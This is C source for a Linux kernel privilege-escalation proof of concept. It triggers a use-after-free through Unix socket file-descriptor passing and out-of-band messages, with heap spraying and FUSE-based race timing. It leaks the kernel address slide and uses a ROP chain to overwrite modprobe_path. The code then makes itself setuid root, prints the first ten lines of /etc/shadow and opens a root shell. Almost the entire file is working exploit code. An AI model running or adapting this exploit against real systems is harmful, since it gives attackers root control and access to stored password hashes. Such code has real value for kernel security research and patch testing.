// poc.c
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>
#include <pthread.h>
#include <assert.h>
#include <fcntl.h>
#include <signal.h>
#include <sched.h>
#include <arpa/inet.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <linux/sockios.h>
#include <sys/resource.h>

typedef unsigned long long u64;
typedef unsigned int u32;

extern u64 cpu_num;
void set_cpu(int cpuid);
int pg_vec_spray(void *src_buf, u32 buf_size, u32 num);
void setup_pg_vec();
pid_t clean_fork(void);
u64 entrybleed_get_kaslr_slide_nopti();

#define SPRAY_NUM_1 0x200
#define SPRAY_NUM_2 0x40
#define SPRAY_NUM_3 0x40
#define FORK_NUM 10
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))
int spray_sock1[SPRAY_NUM_1/0x10];
int spray_sock2[SPRAY_NUM_2/0x10];
int spray_sock3[SPRAY_NUM_3/0x10];
char payload[0x2000];
u64 pg_vec_spray_size = 0x2000;
u64 kaslr_slide = 0;

char path[0x800];

int socks[2];
int socks2[2];
int pid = -1;
void *fuse_addr;

int *stage;
int *status_ptr;

void wait_for_all_status(int status);

void payload_setup()
{
    int fd = open("/tmp/exp/lol", O_RDWR);
    assert(fd >= 0);
    fuse_addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    assert((long long)fuse_addr >= 0);

    memset(payload, 'B', sizeof(payload));
    for(int i=0; i<pg_vec_spray_size/0x100; i++) {
        void *obj = (void *)(payload + i*0x100);
        *(int *)(obj + 0x9e + 4) = 1;
        *(int *)(obj + 0x9e - 4) = 1;
        *(u64*)(obj + 0x9e - 4 - 0x7c - 8) = 0;
        *(u64*)(obj + 0x9e - 4 - 0x7c) = kaslr_slide + 0xffffffff8196a4d5; // : mov rax, qword ptr [rbx + 0x18] ; mov rsi, rbx ; call rax

        // unlink
        *(u64*)(obj + 0xbe) = kaslr_slide + 0xffffffff8438c000;
        *(u64*)(obj + 0xbe +8) = kaslr_slide + 0xffffffff8438c000;

        // pivot
        void *ptr = obj + 0xbe;
        *(u64*)(ptr + 0x18) = kaslr_slide + 0xffffffff81b146da; // : push rdi ; jmp qword ptr [rsi + 0x39]
        *(u64*)(ptr + 0x39) = kaslr_slide + 0xffffffff8223e7da; // : pop rsp; pop rbx; pop rbp; ret;

        // ROP chain
        *(u64*)(ptr + 0x10) = kaslr_slide + 0xffffffff81852574; //: add rsp, 0x48; pop rbp; ret
        *(u64*)(ptr + 0x68) = kaslr_slide + 0xffffffff810f1ce0; //: pop rsi; pop rdi; pop rbx; ret
        *(u64*)(ptr + 0x70) = kaslr_slide + 0xffffffff837de280-0x10; // modprobe_path
        *(u64*)(ptr + 0x78) = 0x782f706d742f; // /tmp/x
        *(u64*)(ptr + 0x80) = 0;
        *(u64*)(ptr + 0x88) = kaslr_slide + 0xffffffff81cdf1d9; // : mov qword ptr [rsi + 0x10], rdi ; xor esi, esi ; xor edi, edi ; ret
        *(u64*)(ptr + 0x90) = kaslr_slide + 0xffffffff82252e95; //: pop rdi; ret;
        *(u64*)(ptr + 0x98) = 0x7fffffff;
        *(u64*)(ptr + 0xa0) = kaslr_slide + 0xffffffff81209f20; // msleep
    }
}

void trigger_gc()
{
    send(socks2[0], fuse_addr, 1, 0);
}

void skb_spray_1()
{
    char buf[0x40];
    memset(buf, 'A', sizeof(buf));
    int i = 0;
    int num = SPRAY_NUM_1;
    int socks[2];

    while(num) {
        int ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
        assert(ret == 0);

        int todo = 0x10;
        if (num < 0x10) todo = num;
        for(int i=0; i<todo; i++) {
            send(socks[0], buf, sizeof(buf), 0);
        }
        num -= todo;
        spray_sock1[i++] = socks[1];
    }
}

void skb_spray_2()
{
    char buf[0x40];
    memset(buf, 'A', sizeof(buf));
    int i = 0;
    int num = SPRAY_NUM_2;
    int socks[2];

    while(num) {
        int ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
        assert(ret == 0);

        int todo = 0x10;
        if (num < 0x10) todo = num;
        for(int i=0; i<todo; i++) {
            send(socks[0], buf, sizeof(buf), 0);
        }
        num -= todo;
        spray_sock2[i++] = socks[1];
    }
}

void skb_spray_3()
{
    char buf[0x40];
    memset(buf, 'A', sizeof(buf));
    int i = 0;
    int num = SPRAY_NUM_3;
    int socks[2];

    while(num) {
        int ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
        assert(ret == 0);

        int todo = 0x10;
        if (num < 0x10) todo = num;
        for(int i=0; i<todo; i++) {
            send(socks[0], buf, sizeof(buf), 0);
        }
        num -= todo;
        spray_sock3[i++] = socks[1];
    }
}

void skb_release_1()
{
    char buf[0x100];
    for(int i=0; i<SPRAY_NUM_1/0x10; i++) {
        recv(spray_sock1[i], buf, 0x100, 0);
    }
}

void skb_release_2()
{
    char buf[0x100];
    for(int i=0; i<SPRAY_NUM_2/0x10; i++) {
        for(int j=0; j<0x10; j++)
            recv(spray_sock2[i], buf, 0x100, 0);
    }
}

void skb_release_3()
{
    char buf[0x100];
    for(int i=0; i<SPRAY_NUM_3/0x10; i++) {
        for(int j=0; j<0x10; j++)
            recv(spray_sock3[i], buf, 0x100, 0);
    }
}

int val = 0;
int *ptr = &val;
void *gc_func(void *arg)
{
    set_cpu(1);

    close(socks[1]);
    close(socks[0]);

    *ptr = 1;
    trigger_gc();
    sleep(10000);
}

void exploit(void)
{
    mmap((void*)0x20000000, 0x1000, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);

    int ret = socketpair(AF_UNIX, SOCK_STREAM, 0, socks);
    assert(ret == 0);

    ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks2);
    assert(ret == 0);

    char ubuf[] = "AA";
    struct iovec vec = {
        .iov_base = ubuf,
        .iov_len = 2,
    };

    struct msghdr msghdr = {
        .msg_name = NULL,
        .msg_namelen = 0,
        .msg_iov = &vec,
        .msg_iovlen = 1,
        .msg_control = (void*)0x20000340,
        .msg_controllen = 0x38,
        .msg_flags = 0,
    };

    *(uint64_t*)0x20000340 = 0x1c;
    *(uint32_t*)0x20000348 = SOL_SOCKET;
    *(uint32_t*)0x2000034c = SCM_CREDENTIALS;
    *(uint32_t*)0x20000350 = getpid();
    *(uint32_t*)0x20000354 = 0;
    *(uint32_t*)0x20000358 = 0;

    *(uint64_t*)0x20000360 = 0x14;
    *(uint32_t*)0x20000368 = SOL_SOCKET;
    *(uint32_t*)0x2000036c = SCM_RIGHTS;
    *(uint32_t*)0x20000370 = socks[0];

    skb_spray_1();

    // make sure the victim skb is in a controlled page
    skb_spray_2();
    sendmsg(socks[1], &msghdr, MSG_OOB);
    skb_spray_3();

    // force the target slab to be in cpu_partial
    skb_release_2();
    skb_release_3();

    // flush cpu_partial
    skb_release_1();
    sleep(1);

    // trigger the free in another thread and delay the trigger using FUSE
    pthread_t tid = 0;
    ret = pthread_create(&tid, NULL, gc_func, NULL);
    assert(ret == 0 );
    while(*ptr != 1);

    // now spray pages using multiple processes
    *stage = 1;
    pg_vec_spray(payload, pg_vec_spray_size, 0x200);
    wait_for_all_status(1);

    // now sleep forever and wait for the payload to get triggered
    puts("[*] wait for the payload to get triggered");
    while(1);sleep(1000000);
}

void increase_inflight(int num)
{
    int socks[2];
    int socks2[2];
    int ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);
    assert(ret == 0);

    ret = socketpair(AF_UNIX, SOCK_DGRAM, 0, socks2);
    assert(ret == 0);

    char ubuf[] = "A";
    struct iovec vec = {
        .iov_base = ubuf,
        .iov_len = 1,
    };

    int buf_size = CMSG_ALIGN(0x10+num*sizeof(int));
    void *buf = malloc(buf_size);
    memset(buf, 0, buf_size);

    struct msghdr msghdr = {
        .msg_name = NULL,
        .msg_namelen = 0,
        .msg_iov = &vec,
        .msg_iovlen = 1,
        .msg_control = buf,
        .msg_controllen = buf_size,
        .msg_flags = 0,
    };

    struct cmsghdr *cmsghdr = (struct cmsghdr *)buf;
    cmsghdr->cmsg_len = 0x10+num*sizeof(int);
    cmsghdr->cmsg_level = SOL_SOCKET;
    cmsghdr->cmsg_type = SCM_RIGHTS;
    int *fd_array = (int *)(buf + sizeof(struct cmsghdr));
    for(int i=0; i<num; i++) {
        fd_array[i] = socks2[0];
    }

    ret = sendmsg(socks[1], &msghdr, 0);
    assert(ret >= 0);
}

void prepare_force_gc()
{
    for(int i=0; i<16; i++) {
        if(!clean_fork()) {
            for(int j=0; j<5; j++) {
                increase_inflight(200);
            }
            sleep(100000);
        }
    }
    sleep(1);
}

void spray_func(int idx)
{
    while(*stage == 0);
    pg_vec_spray(payload, pg_vec_spray_size, 0x200);
    status_ptr[idx] = 1;

    sleep(10000);
    // while(1);
}

void setup_context(void)
{
    // depending on the number of CPU, our target slab will have different number of pages
    if (cpu_num > 4) {
        pg_vec_spray_size = 0x2000;
    } else {
        pg_vec_spray_size = 0x1000;
    }
    printf("[*] pg_vec_spray_size: %#llx\n", pg_vec_spray_size);

    stage = (int *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON, -1, 0);
    assert((long)stage != -1);
    *stage = 0;
    status_ptr = stage + 1;

    for(int i=0; i<FORK_NUM; i++) {
        if(!clean_fork()){
            spray_func(i);
            exit(0);
        }
    }
}

void wait_for_all_status(int status)
{
    int done = 0;
    while(1) {
        for(int i=0; i<FORK_NUM; i++) {
            if(status_ptr[i] != status) continue;
            if(i == FORK_NUM-1) return;
        }
    }
}

void increase_limit()
{
    int ret;
    struct rlimit open_file_limit;

    /* Query current soft/hard value */
    ret = getrlimit(RLIMIT_NOFILE, &open_file_limit);
    assert(ret >= 0);

    /* Set soft limit to hard limit */
    open_file_limit.rlim_cur = open_file_limit.rlim_max;
    ret = setrlimit(RLIMIT_NOFILE, &open_file_limit);
    assert(ret >= 0);
}

void attempt()
{
    char *buf = getenv("SLIDE");
    kaslr_slide = (u64)atoll(buf);
    printf("[*] exploit attempt with kaslr_slide: %#llx\n", kaslr_slide);
    increase_limit();
    setup_pg_vec();
    payload_setup();
    setup_context();

    exploit();
}

int modprobe_overwritten() {
    int fd = open("/proc/sys/kernel/modprobe", 0);
    char buf[0x2000];
    memset(buf, 0, sizeof(buf));
    read(fd, buf, sizeof(buf));
    return !strncmp(buf, "/tmp/x", 6);
}

void check_root() {
    // if we are root
    if (open("/etc/shadow", 0) >= 0) {
        setuid(0);
        setgid(0);
        puts("============================");
        puts("|   Pwned by MikuSec       |");
        puts("============================");
        system("id;");
        puts("============================");
        system("head -n 10 /etc/shadow");
        puts("============================");
        system("/bin/bash");
        exit(0);
    }
    // or if we can be root
    int tmp_fd = open("/proc/sys/kernel/modprobe", 0);
    char buf[0x2000];
    memset(buf, 0, sizeof(buf));
    read(tmp_fd, buf, sizeof(buf));
    if (!strncmp(buf, "/tmp/x", 6)) {
        sprintf(buf, "echo '#!/bin/bash\\nchown root:root %s; chmod 04755 %s' > /tmp/x; chmod +x /tmp/x", path, path);
        system(buf);
        system("echo 1 > /tmp/1; chmod +x /tmp/1; /tmp/1 2> /dev/null");
        char * argv[] = {
            path,
            NULL
        };
        char * env[] = {
            NULL
        };
        execve(path, argv, env);
    }
}

int main(int argc, char ** argv, char ** env)
{
    // save absolute path for later use
    if (argc && argv[0] && argv[0][0]) assert(realpath(argv[0], path) != NULL);

    // in case we already are/can be root
    check_root();

    // if this is an exploit process
    if (getenv("SLIDE")) {
        puts("[*] attempt!");
        attempt();
        exit(0);
    }

    // launch fuse
    system("mkdir -p /tmp/exp && ./build/fusefs /tmp/exp");

    // prepare
    increase_limit();
    prepare_force_gc();

    // launch exploit process
    char *cmd = NULL;
    int ret = asprintf(&cmd, "busybox sh -c 'unshare -rn %s'", path);
    assert(ret >= 0);
    puts(cmd);
    while(1) {
        // leak kaslr
        kaslr_slide = entrybleed_get_kaslr_slide_nopti();
        if (kaslr_slide == -1) {
            puts("[-] fail to leak kaslr_slide");
            continue;
        }
        printf("[+] kaslr_slide: %#llx\n", kaslr_slide);

        // pass it to the exploit process
        char *buf = NULL;
        ret = asprintf(&buf, "%lld", kaslr_slide);
        assert(ret >= 0);
        setenv("SLIDE", buf, 1);

        if(!clean_fork()) {
            system(cmd);
            sleep(10000);
        }

        // give each exploit 6 seconds to run
        int good = 0;
        for(int i=0; i<6; i++) {
            if (modprobe_overwritten()) {
                good = 1;
                break;
            }
            sleep(1);
        }

        // check whether we succeed or not
        if (good) {
            puts("[+] successfully overwrite modprobe_path");
            break;
        } else {
            puts("[-] failed to overwrite modprobe_path");
        }
    }

    check_root();
    while(1) sleep(100000);
    return 0;
}